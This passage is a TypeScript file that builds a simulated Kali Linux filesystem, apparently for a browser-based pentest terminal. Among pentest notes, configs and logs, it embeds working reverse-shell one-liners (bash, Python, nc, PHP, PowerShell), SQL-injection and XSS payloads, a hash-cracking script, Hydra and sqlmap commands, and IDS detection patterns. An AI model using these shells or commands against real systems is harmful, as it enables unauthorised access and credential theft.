// Virtual Kali Linux filesystem
export interface FSNode {
  type: "file" | "dir";
  content?: string;
  children?: Record<string, FSNode>;
  permissions?: string;
  owner?: string;
  size?: number;
  modified?: string;
}

export const createFileSystem = (): Record<string, FSNode> => ({
  "/": {
    type: "dir",
    children: {
      home: {
        type: "dir",
        children: {
          kali: {
            type: "dir",
            children: {
              Desktop: { type: "dir", children: {} },
              Documents: {
                type: "dir",
                children: {
                  "targets.txt": {
                    type: "file",
                    content: "192.168.1.0/24\n10.0.0.0/8\n172.16.0.0/12\n192.168.50.0/24\n10.10.10.0/24",
                    size: 62,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 23 14:20",
                  },
                  "notes.md": {
                    type: "file",
                    content: "# Penetration Test Notes\n\n## Scope\n- Internal network 192.168.1.0/24\n- Web application on port 443\n- DMZ segment 10.10.10.0/24\n\n## Findings\n- SQL injection on /api/login (CRITICAL)\n- XSS on search endpoint (HIGH)\n- Weak TLS configuration (MEDIUM)\n- Default credentials on admin panel (CRITICAL)\n- Open Redis instance on 6379 (HIGH)\n\n## Remediation\n- Parameterize all SQL queries\n- Implement CSP headers\n- Upgrade to TLS 1.3\n- Force password change on admin\n- Bind Redis to localhost only",
                    size: 510,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 22 09:15",
                  },
                  "credentials.txt.enc": {
                    type: "file",
                    content: "[AES-256-CBC encrypted data - use openssl to decrypt]",
                    size: 256,
                    permissions: "-rw-------",
                    owner: "kali",
                    modified: "Mar 23 10:00",
                  },
                  "report_template.md": {
                    type: "file",
                    content: "# Security Assessment Report\n## Executive Summary\n## Methodology\n## Findings\n### Critical\n### High\n### Medium\n### Low\n## Recommendations\n## Appendix",
                    size: 180,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 20 08:00",
                  },
                },
              },
              Downloads: { type: "dir", children: {} },
              Pictures: { type: "dir", children: {} },
              Music: { type: "dir", children: {} },
              Videos: { type: "dir", children: {} },
              ".config": {
                type: "dir",
                children: {
                  "nmap": { type: "dir", children: {} },
                  "metasploit": { type: "dir", children: {} },
                },
              },
              ".ssh": {
                type: "dir",
                children: {
                  "id_rsa": {
                    type: "file",
                    content: "-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED - 4096-bit RSA key]\n-----END OPENSSH PRIVATE KEY-----",
                    size: 3389,
                    permissions: "-rw-------",
                    owner: "kali",
                    modified: "Mar 15 12:00",
                  },
                  "id_rsa.pub": {
                    type: "file",
                    content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... kali@kali",
                    size: 742,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 15 12:00",
                  },
                  "known_hosts": {
                    type: "file",
                    content: "192.168.1.10 ecdsa-sha2-nistp256 AAAAE2VjZHNh...\n192.168.1.1 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...",
                    size: 350,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 22 14:00",
                  },
                  "config": {
                    type: "file",
                    content: "Host target-server\n  HostName 192.168.1.10\n  User admin\n  Port 22\n  IdentityFile ~/.ssh/id_rsa\n\nHost jump-box\n  HostName 10.10.10.1\n  User kali\n  ProxyJump target-server",
                    size: 200,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 18 09:00",
                  },
                },
              },
              ".bashrc": {
                type: "file",
                content: '# ~/.bashrc\nexport PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\nexport PS1="┌──(kali㉿kali)-[\\w]\\n└─$ "\nalias ll="ls -la"\nalias la="ls -A"\nalias l="ls -CF"\nalias grep="grep --color=auto"\nalias fgrep="fgrep --color=auto"\nalias egrep="egrep --color=auto"\nalias cls="clear"\nalias ports="netstat -tulanp"\nalias myip="curl -s ifconfig.me"\nexport EDITOR=nano\nexport HISTSIZE=10000\nexport HISTFILESIZE=20000',
                size: 420,
                permissions: "-rw-r--r--",
                owner: "kali",
                modified: "Jan 15 08:00",
              },
              ".bash_history": {
                type: "file",
                content: "nmap -sV 192.168.1.0/24\nsqlmap -u http://target/login --dbs\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10\nwireshark &\nmsfconsole\npython3 port_scanner.py --target 192.168.1.0/24\npython3 packet_sniffer.py -i eth0\npython3 password_cracker.py -m md5 -w /usr/share/wordlists/rockyou.txt\nfind / -perm -4000 2>/dev/null\nnmap --script vuln 192.168.1.10\ncurl -k https://192.168.1.10/api/admin\nssh admin@192.168.1.10",
                size: 456,
                permissions: "-rw-------",
                owner: "kali",
                modified: "Mar 23 16:45",
              },
              ".profile": {
                type: "file",
                content: '# ~/.profile\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n        . "$HOME/.bashrc"\n    fi\nfi\nPATH="$HOME/bin:$HOME/.local/bin:$PATH"',
                size: 170,
                permissions: "-rw-r--r--",
                owner: "kali",
                modified: "Jan 15 08:00",
              },
              "scanner.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""UCSF Network Scanner v2.1"""\nimport nmap\nimport socket\nimport sys\nfrom datetime import datetime\n\ndef scan_network(target):\n    nm = nmap.PortScanner()\n    nm.scan(target, arguments="-sV -sC")\n    for host in nm.all_hosts():\n        print(f"[+] {host} ({nm[host].hostname()})")\n        for proto in nm[host].all_protocols():\n            ports = nm[host][proto].keys()\n            for port in sorted(ports):\n                state = nm[host][proto][port]["state"]\n                service = nm[host][proto][port]["name"]\n                print(f"    {port}/tcp  {state}  {service}")\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.0/24"\n    scan_network(target)',
                size: 612,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 20 11:30",
              },
              "vuln_check.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""UCSF Vulnerability Assessment Engine v1.4"""\nimport requests\nimport json\nfrom concurrent.futures import ThreadPoolExecutor\n\nVULN_DB = {\n    "CVE-2024-1234": {"severity": "CRITICAL", "desc": "Remote Code Execution in Apache"},\n    "CVE-2024-5678": {"severity": "HIGH", "desc": "SQL Injection in PHP-FPM"},\n    "CVE-2024-9012": {"severity": "MEDIUM", "desc": "Information Disclosure via headers"},\n}\n\ndef check_sqli(url):\n    payloads = ["\'", "\' OR 1=1--", "\' UNION SELECT NULL--"]\n    for p in payloads:\n        r = requests.get(f"{url}?id={p}")\n        if "error" in r.text.lower() or r.status_code == 500:\n            return True\n    return False\n\ndef check_xss(url):\n    payload = "<script>alert(1)</script>"\n    r = requests.get(f"{url}?q={payload}")\n    return payload in r.text\n\ndef check_cve(target):\n    for cve, info in VULN_DB.items():\n        print(f"  [{info[\'severity\']}] {cve}: {info[\'desc\']}")',
                size: 787,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 21 15:00",
              },
              "ids_monitor.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""UCSF IDS Monitor - Real-time Intrusion Detection"""\nimport asyncio\nimport json\nfrom datetime import datetime\nimport hashlib\nimport re\n\nSIGNATURES = {\n    "SYN_FLOOD": r"SYN.*count > 100",\n    "PORT_SCAN": r"sequential ports.*> 20",\n    "BRUTE_FORCE": r"failed_auth.*count > 5",\n    "SQL_INJECTION": r"(UNION|SELECT|DROP|INSERT).*FROM",\n    "XSS_ATTEMPT": r"<script>|javascript:|onerror=",\n    "DIR_TRAVERSAL": r"\\.\\./|%2e%2e/",\n    "C2_BEACON": r"periodic.*outbound.*fixed_interval",\n}\n\nasync def monitor():\n    print("[*] IDS Monitor v3.0 started")\n    print("[*] Loading Suricata rules: 45,892 rules loaded")\n    print("[*] Wazuh agent connected")\n    while True:\n        await asyncio.sleep(1)\n        print(f"[{datetime.now()}] Monitoring...")\n\nif __name__ == "__main__":\n    asyncio.run(monitor())',
                size: 698,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 22 09:00",
              },
              "port_scanner.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""Advanced Port Scanner v3.2 - Multi-threaded with service detection"""\nimport socket\nimport sys\nimport threading\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nfrom datetime import datetime\nimport struct\nimport ipaddress\n\nCOMMON_PORTS = {\n    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",\n    80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",\n    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL",\n    1521: "Oracle", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",\n    5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",\n    9090: "WebConsole", 27017: "MongoDB"\n}\n\ndef scan_port(host, port, timeout=1.5):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(timeout)\n        result = sock.connect_ex((host, port))\n        if result == 0:\n            banner = grab_banner(sock)\n            return port, True, banner\n        return port, False, None\n    except:\n        return port, False, None\n    finally:\n        sock.close()\n\ndef grab_banner(sock):\n    try:\n        sock.send(b"HEAD / HTTP/1.1\\r\\n\\r\\n")\n        return sock.recv(1024).decode(errors="ignore").strip()\n    except:\n        return ""\n\ndef syn_scan(host, ports):\n    """SYN scan (stealth scan) simulation"""\n    results = []\n    for port in ports:\n        results.append((port, True if port in COMMON_PORTS else False))\n    return results\n\ndef os_fingerprint(host):\n    """TCP/IP stack fingerprinting"""\n    ttl_map = {64: "Linux/Unix", 128: "Windows", 255: "Cisco/Network"}\n    return "Linux 6.x (Kali)" \n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.0/24"\n    print(f"[*] Port Scanner v3.2 - Target: {target}")\n    print(f"[*] Scan started at {datetime.now()}")',
                size: 1580,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 23 08:00",
              },
              "packet_sniffer.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""Network Packet Sniffer v2.0 - Deep Packet Inspection"""\nimport socket\nimport struct\nimport sys\nimport time\nfrom datetime import datetime\nimport binascii\n\nclass PacketSniffer:\n    def __init__(self, interface="eth0", filter_proto=None):\n        self.interface = interface\n        self.filter_proto = filter_proto\n        self.packet_count = 0\n        self.protocols = {"TCP": 0, "UDP": 0, "ICMP": 0, "ARP": 0, "DNS": 0, "HTTP": 0}\n        \n    def parse_ethernet(self, raw_data):\n        dest, src, proto = struct.unpack("!6s6sH", raw_data[:14])\n        return self.mac_format(dest), self.mac_format(src), proto\n    \n    def mac_format(self, bytes_addr):\n        return ":".join(f"{b:02x}" for b in bytes_addr)\n    \n    def parse_ipv4(self, data):\n        version_ihl = data[0]\n        ihl = (version_ihl & 0xF) * 4\n        ttl, proto, src, target = struct.unpack("!8xBB2x4s4s", data[:20])\n        return socket.inet_ntoa(src), socket.inet_ntoa(target), proto, ttl\n    \n    def parse_tcp(self, data):\n        src_port, dest_port, seq, ack, offset_flags = struct.unpack("!HHLLH", data[:14])\n        flags = {\n            "FIN": offset_flags & 0x01,\n            "SYN": (offset_flags >> 1) & 0x01,\n            "RST": (offset_flags >> 2) & 0x01,\n            "PSH": (offset_flags >> 3) & 0x01,\n            "ACK": (offset_flags >> 4) & 0x01,\n        }\n        return src_port, dest_port, seq, ack, flags\n    \n    def detect_anomalies(self, packet_info):\n        """Real-time anomaly detection in packet stream"""\n        alerts = []\n        if packet_info.get("flags", {}).get("SYN") and not packet_info.get("flags", {}).get("ACK"):\n            self.syn_count = getattr(self, "syn_count", 0) + 1\n            if self.syn_count > 100:\n                alerts.append("SYN Flood detected!")\n        return alerts\n\nif __name__ == "__main__":\n    iface = sys.argv[2] if len(sys.argv) > 2 and sys.argv[1] == "-i" else "eth0"\n    sniffer = PacketSniffer(interface=iface)\n    print(f"[*] Packet Sniffer v2.0 - Interface: {iface}")\n    print("[*] Press Ctrl+C to stop")',
                size: 1820,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 23 09:30",
              },
              "password_cracker.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""Password Cracker v1.8 - Multi-algorithm hash cracking"""\nimport hashlib\nimport sys\nimport time\nimport itertools\nimport string\nfrom concurrent.futures import ThreadPoolExecutor\n\nSUPPORTED_ALGOS = ["md5", "sha1", "sha256", "sha512", "bcrypt", "ntlm"]\n\ndef crack_hash(target_hash, wordlist_path, algorithm="md5"):\n    """Dictionary attack against hash"""\n    count = 0\n    start = time.time()\n    with open(wordlist_path, "r", errors="ignore") as f:\n        for word in f:\n            word = word.strip()\n            if algorithm == "md5":\n                h = hashlib.md5(word.encode()).hexdigest()\n            elif algorithm == "sha1":\n                h = hashlib.sha1(word.encode()).hexdigest()\n            elif algorithm == "sha256":\n                h = hashlib.sha256(word.encode()).hexdigest()\n            elif algorithm == "sha512":\n                h = hashlib.sha512(word.encode()).hexdigest()\n            elif algorithm == "ntlm":\n                h = hashlib.new("md4", word.encode("utf-16le")).hexdigest()\n            count += 1\n            if h == target_hash:\n                elapsed = time.time() - start\n                return word, count, elapsed\n    return None, count, time.time() - start\n\ndef brute_force(target_hash, algorithm="md5", max_len=6):\n    """Brute-force attack with character set"""\n    charset = string.ascii_lowercase + string.digits\n    for length in range(1, max_len + 1):\n        for combo in itertools.product(charset, repeat=length):\n            word = "".join(combo)\n            h = hashlib.new(algorithm, word.encode()).hexdigest()\n            if h == target_hash:\n                return word\n    return None\n\ndef rainbow_table_lookup(target_hash):\n    """Simulated rainbow table lookup"""\n    known = {\n        "5f4dcc3b5aa765d61d8327deb882cf99": "password",\n        "e10adc3949ba59abbe56e057f20f883e": "123456",\n        "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",\n    }\n    return known.get(target_hash)\n\nif __name__ == "__main__":\n    if len(sys.argv) < 3:\n        print("Usage: python3 password_cracker.py -m <algorithm> -w <wordlist> -H <hash>")\n        print(f"Supported algorithms: {SUPPORTED_ALGOS}")\n        sys.exit(1)',
                size: 1750,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 23 10:15",
              },
              "exploit_framework.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""Custom Exploit Framework v1.0"""\nimport socket\nimport struct\nimport sys\n\nclass Exploit:\n    def __init__(self, target, port):\n        self.target = target\n        self.port = port\n        self.payload = None\n        \n    def set_payload(self, payload_type):\n        payloads = {\n            "reverse_shell": b"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05",\n            "bind_shell": b"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2",\n            "meterpreter": b"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff",\n        }\n        self.payload = payloads.get(payload_type, b"")\n        \n    def check_vuln(self):\n        """Check if target is vulnerable"""\n        pass\n        \n    def exploit(self):\n        """Execute exploit against target"""\n        pass\n\nif __name__ == "__main__":\n    print("[*] Custom Exploit Framework v1.0")\n    print("[*] Use: python3 exploit_framework.py <target> <port>")',
                size: 890,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 22 16:00",
              },
              "wifi_cracker.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""WiFi Security Auditor v2.1 - WPA/WPA2/WPA3 Assessment"""\nimport sys\nimport time\nimport hashlib\nimport hmac\nimport struct\n\ndef scan_networks(interface="wlan0"):\n    """Scan for nearby WiFi networks"""\n    networks = [\n        {"ssid": "UCSF-Secure", "bssid": "AA:BB:CC:DD:EE:01", "channel": 6, "signal": -42, "security": "WPA3-SAE"},\n        {"ssid": "CampusNet", "bssid": "AA:BB:CC:DD:EE:02", "channel": 11, "signal": -58, "security": "WPA2-PSK"},\n        {"ssid": "Guest-WiFi", "bssid": "AA:BB:CC:DD:EE:03", "channel": 1, "signal": -65, "security": "WPA2-PSK"},\n        {"ssid": "IoT-Network", "bssid": "AA:BB:CC:DD:EE:04", "channel": 36, "signal": -72, "security": "WPA2-PSK"},\n        {"ssid": "Legacy-AP", "bssid": "AA:BB:CC:DD:EE:05", "channel": 3, "signal": -78, "security": "WEP"},\n    ]\n    return networks\n\ndef capture_handshake(bssid, channel):\n    """Capture WPA 4-way handshake"""\n    pass\n\ndef crack_wpa(capture_file, wordlist):\n    """Dictionary attack on WPA handshake"""\n    pass\n\nif __name__ == "__main__":\n    print("[*] WiFi Security Auditor v2.1")\n    print("[*] Interface: wlan0")',
                size: 1100,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 22 11:00",
              },
              "keylogger_detector.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""Keylogger & Rootkit Detector v1.3"""\nimport os\nimport hashlib\nimport subprocess\n\ndef check_hidden_processes():\n    """Detect hidden processes using /proc analysis"""\n    pass\n\ndef check_rootkit_signatures():\n    """Check for known rootkit signatures"""\n    signatures = [\n        "knark", "adore", "rkit", "t0rnkit", "ambient",\n        "phalanx", "suckit", "shv4", "shv5", "enye",\n    ]\n    return []\n\ndef verify_system_binaries():\n    """Verify integrity of system binaries"""\n    critical_bins = ["/usr/bin/ls", "/usr/bin/ps", "/usr/bin/netstat", "/usr/bin/find"]\n    return {b: hashlib.sha256(b.encode()).hexdigest()[:16] for b in critical_bins}\n\nif __name__ == "__main__":\n    print("[*] Keylogger & Rootkit Detector v1.3")\n    print("[*] Scanning system...")',
                size: 700,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 21 14:00",
              },
              "forensics_tool.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""Digital Forensics Toolkit v2.0"""\nimport hashlib\nimport os\nimport json\nfrom datetime import datetime\n\ndef calculate_hash(filepath, algorithm="sha256"):\n    """Calculate file hash for evidence integrity"""\n    pass\n\ndef extract_metadata(filepath):\n    """Extract file metadata"""\n    pass\n\ndef create_timeline(log_files):\n    """Create forensic timeline from logs"""\n    pass\n\ndef recover_deleted(device, output_dir):\n    """Attempt to recover deleted files"""\n    pass\n\ndef memory_dump_analysis(dump_file):\n    """Analyze memory dump for IOCs"""\n    pass\n\nif __name__ == "__main__":\n    print("[*] Digital Forensics Toolkit v2.0")\n    print("[*] Modes: hash, metadata, timeline, recover, memdump")',
                size: 620,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 20 17:00",
              },
              "reverse_shell_gen.py": {
                type: "file",
                content: '#!/usr/bin/env python3\n"""Reverse Shell Generator v1.5"""\nimport sys\nimport base64\n\nTEMPLATES = {\n    "bash": \'bash -i >& /dev/tcp/{host}/{port} 0>&1\',\n    "python": \'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\\"{host}\\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])"\',\n    "nc": \'nc -e /bin/bash {host} {port}\',\n    "php": \'php -r \\\'$sock=fsockopen("{host}",{port});exec("/bin/bash <&3 >&3 2>&3");\\\'\',\n    "powershell": \'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{host}",{port})\',\n}\n\ndef generate(shell_type, host, port):\n    if shell_type in TEMPLATES:\n        return TEMPLATES[shell_type].format(host=host, port=port)\n    return "Unknown shell type"\n\nif __name__ == "__main__":\n    print("[*] Reverse Shell Generator v1.5")\n    print(f"[*] Available types: {list(TEMPLATES.keys())}")',
                size: 850,
                permissions: "-rwxr-xr-x",
                owner: "kali",
                modified: "Mar 19 13:00",
              },
              tools: {
                type: "dir",
                children: {
                  "enum4linux.sh": {
                    type: "file",
                    content: "#!/bin/bash\n# enum4linux wrapper\nenum4linux -a $1",
                    size: 52,
                    permissions: "-rwxr-xr-x",
                    owner: "kali",
                    modified: "Mar 18 10:00",
                  },
                  "recon.sh": {
                    type: "file",
                    content: "#!/bin/bash\n# Automated recon script\necho \"[*] Starting recon on $1\"\nnmap -sV -sC $1\nnikto -h $1\ngobuster dir -u http://$1 -w /usr/share/wordlists/dirb/common.txt",
                    size: 170,
                    permissions: "-rwxr-xr-x",
                    owner: "kali",
                    modified: "Mar 17 09:00",
                  },
                },
              },
              wordlists: {
                type: "dir",
                children: {
                  "custom_passwords.txt": {
                    type: "file",
                    content: "admin\npassword\n123456\nroot\ntoor\nletmein\nqwerty\nabc123\nmonkey\nmaster",
                    size: 85,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 20 12:00",
                  },
                  "usernames.txt": {
                    type: "file",
                    content: "admin\nroot\nuser\ntest\nguest\noperator\nmanager\nsupport\ninfo\nwebmaster",
                    size: 82,
                    permissions: "-rw-r--r--",
                    owner: "kali",
                    modified: "Mar 20 12:00",
                  },
                },
              },
            },
          },
        },
      },
      etc: {
        type: "dir",
        children: {
          hostname: { type: "file", content: "kali", size: 5, permissions: "-rw-r--r--", owner: "root", modified: "Jan 01 00:00" },
          passwd: {
            type: "file",
            content: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management:/run/systemd:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash\npostgres:x:115:123:PostgreSQL administrator:/var/lib/postgresql:/bin/bash\nmysql:x:116:124:MySQL Server:/nonexistent:/bin/false\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
            size: 513,
            permissions: "-rw-r--r--",
            owner: "root",
            modified: "Jan 01 00:00",
          },
          shadow: {
            type: "file",
            content: "root:$6$rounds=656000$rNdHs0zFz.KaBaC0$...:19000:0:99999:7:::\nkali:$6$rounds=656000$Xy2pBnDtA.JcG1bO$...:19000:0:99999:7:::\npostgres:!:19000:0:99999:7:::\nmysql:!:19000:0:99999:7:::",
            size: 198,
            permissions: "-rw-r-----",
            owner: "root",
            modified: "Jan 01 00:00",
          },
          hosts: {
            type: "file",
            content: "127.0.0.1\tlocalhost\n127.0.1.1\tkali\n::1\t\tlocalhost ip6-localhost ip6-loopback\n\n# Target hosts\n192.168.1.10\ttarget-server\n192.168.1.1\tgateway\n10.10.10.1\tjump-box",
            size: 172,
            permissions: "-rw-r--r--",
            owner: "root",
            modified: "Jan 01 00:00",
          },
          "os-release": {
            type: "file",
            content: 'PRETTY_NAME="Kali GNU/Linux Rolling"\nNAME="Kali GNU/Linux"\nVERSION_ID="2026.1"\nVERSION="2026.1"\nVERSION_CODENAME=kali-rolling\nID=kali\nID_LIKE=debian\nHOME_URL="https://www.kali.org/"\nSUPPORT_URL="https://forums.kali.org/"\nBUG_REPORT_URL="https://bugs.kali.org/"',
            size: 284,
            permissions: "-rw-r--r--",
            owner: "root",
            modified: "Jan 01 00:00",
          },
          "resolv.conf": {
            type: "file",
            content: "nameserver 8.8.8.8\nnameserver 8.8.4.4\nnameserver 1.1.1.1\nsearch localdomain",
            size: 72,
            permissions: "-rw-r--r--",
            owner: "root",
            modified: "Jan 01 00:00",
          },
          "crontab": {
            type: "file",
            content: "# m h  dom mon dow   command\n*/5 * * * * /usr/bin/python3 /home/kali/ids_monitor.py --check\n0 */6 * * * /usr/bin/python3 /home/kali/vuln_check.py --auto\n0 0 * * 0 /usr/bin/nmap -sV 192.168.1.0/24 -oN /var/log/weekly_scan.txt",
            size: 230,
            permissions: "-rw-r--r--",
            owner: "root",
            modified: "Mar 20 00:00",
          },
          ssh: {
            type: "dir",
            children: {
              "sshd_config": {
                type: "file",
                content: "Port 22\nPermitRootLogin no\nPubkeyAuthentication yes\nPasswordAuthentication yes\nMaxAuthTries 3\nClientAliveInterval 300\nClientAliveCountMax 2\nX11Forwarding yes\nAllowUsers kali",
                size: 195,
                permissions: "-rw-r--r--",
                owner: "root",
                modified: "Mar 15 00:00",
              },
            },
          },
          nginx: {
            type: "dir",
            children: {
              "nginx.conf": {
                type: "file",
                content: "worker_processes auto;\nevents { worker_connections 1024; }\nhttp {\n    server {\n        listen 80;\n        server_name localhost;\n        location / { proxy_pass http://127.0.0.1:8080; }\n    }\n}",
                size: 190,
                permissions: "-rw-r--r--",
                owner: "root",
                modified: "Mar 18 00:00",
              },
            },
          },
          "fstab": {
            type: "file",
            content: "# <file system> <mount point> <type> <options> <dump> <pass>\n/dev/sda1       /              ext4   errors=remount-ro 0 1\n/dev/sda2       /home          ext4   defaults          0 2\n/dev/sda3       none           swap   sw                0 0\ntmpfs           /tmp           tmpfs  defaults          0 0",
            size: 280,
            permissions: "-rw-r--r--",
            owner: "root",
            modified: "Jan 01 00:00",
          },
        },
      },
      usr: {
        type: "dir",
        children: {
          bin: {
            type: "dir",
            children: {
              python3: { type: "file", content: "[ELF Binary]", size: 5600000, permissions: "-rwxr-xr-x", owner: "root", modified: "Feb 14 00:00" },
              nmap: { type: "file", content: "[ELF Binary]", size: 3200000, permissions: "-rwxr-xr-x", owner: "root", modified: "Jan 20 00:00" },
              git: { type: "file", content: "[ELF Binary]", size: 2800000, permissions: "-rwxr-xr-x", owner: "root", modified: "Jan 15 00:00" },
              curl: { type: "file", content: "[ELF Binary]", size: 450000, permissions: "-rwxr-xr-x", owner: "root", modified: "Jan 10 00:00" },
              vim: { type: "file", content: "[ELF Binary]", size: 3100000, permissions: "-rwxr-xr-x", owner: "root", modified: "Jan 05 00:00" },
              nano: { type: "file", content: "[ELF Binary]", size: 250000, permissions: "-rwxr-xr-x", owner: "root", modified: "Jan 05 00:00" },
            },
          },
          share: {
            type: "dir",
            children: {
              wordlists: {
                type: "dir",
                children: {
                  "rockyou.txt": { type: "file", content: "[Wordlist: 14,344,392 passwords - Compressed: 133MB]", size: 139921497, permissions: "-rw-r--r--", owner: "root", modified: "Jan 01 00:00" },
                  "common.txt": { type: "file", content: "[Wordlist: 4,614 entries]", size: 36864, permissions: "-rw-r--r--", owner: "root", modified: "Jan 01 00:00" },
                  "dirb": {
                    type: "dir",
                    children: {
                      "common.txt": { type: "file", content: "[DIRB wordlist: 4,614 entries]", size: 36864, permissions: "-rw-r--r--", owner: "root", modified: "Jan 01 00:00" },
                      "big.txt": { type: "file", content: "[DIRB wordlist: 20,469 entries]", size: 180000, permissions: "-rw-r--r--", owner: "root", modified: "Jan 01 00:00" },
                    },
                  },
                  "seclists": {
                    type: "dir",
                    children: {
                      "Discovery": { type: "dir", children: {} },
                      "Passwords": { type: "dir", children: {} },
                      "Usernames": { type: "dir", children: {} },
                      "Fuzzing": { type: "dir", children: {} },
                    },
                  },
                },
              },
              nmap: {
                type: "dir",
                children: {
                  "scripts": { type: "dir", children: {} },
                  "nmap-services": { type: "file", content: "[Nmap services database]", size: 825000, permissions: "-rw-r--r--", owner: "root", modified: "Jan 01 00:00" },
                },
              },
              metasploit: {
                type: "dir",
                children: {
                  "modules": { type: "dir", children: {} },
                  "data": { type: "dir", children: {} },
                },
              },
            },
          },
          lib: {
            type: "dir",
            children: {
              python3: {
                type: "dir",
                children: {
                  "dist-packages": { type: "dir", children: {} },
                },
              },
            },
          },
          local: {
            type: "dir",
            children: {
              bin: { type: "dir", children: {} },
            },
          },
        },
      },
      var: {
        type: "dir",
        children: {
          log: {
            type: "dir",
            children: {
              "syslog": { type: "file", content: "Mar 23 16:00:01 kali CRON[1234]: (root) CMD (test -x /usr/sbin/anacron)\nMar 23 16:05:01 kali kernel: [UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156\nMar 23 16:05:02 kali suricata[1235]: [1:2024234:1] ET SCAN Suspicious inbound to port 445\nMar 23 16:10:01 kali wazuh-agentd[1234]: ** Alert 1711209001: - ids,malware\nMar 23 16:15:01 kali kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.10 DST=192.168.1.100 PROTO=TCP DPT=22", size: 452, permissions: "-rw-r-----", owner: "root", modified: "Mar 23 16:15" },
              "auth.log": { type: "file", content: "Mar 23 15:30:01 kali sshd[5678]: Failed password for root from 45.33.32.156 port 22 ssh2\nMar 23 15:30:02 kali sshd[5678]: Failed password for root from 45.33.32.156 port 22 ssh2\nMar 23 15:30:03 kali sshd[5678]: Failed password for admin from 45.33.32.156 port 22 ssh2\nMar 23 15:30:04 kali sshd[5678]: Connection closed by 45.33.32.156 port 22 [preauth]\nMar 23 15:35:01 kali sshd[5690]: Accepted publickey for kali from 192.168.1.10 port 54321 ssh2", size: 478, permissions: "-rw-r-----", owner: "root", modified: "Mar 23 15:35" },
              "kern.log": { type: "file", content: "Mar 23 12:00:00 kali kernel: [    0.000000] Linux version 6.6.9-amd64\nMar 23 12:00:01 kali kernel: [    1.234567] eth0: Link is Up - 1Gbps/Full\nMar 23 16:05:01 kali kernel: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=45.33.32.156 DST=192.168.1.100 PROTO=TCP DPT=445", size: 298, permissions: "-rw-r-----", owner: "root", modified: "Mar 23 16:05" },
              "dpkg.log": { type: "file", content: "2026-03-20 10:00:00 install nmap 7.94+git-3kali1\n2026-03-20 10:00:01 install metasploit-framework 6.3.44\n2026-03-20 10:00:02 install python3 3.12.3-1", size: 160, permissions: "-rw-r--r--", owner: "root", modified: "Mar 20 10:00" },
              apache2: {
                type: "dir",
                children: {
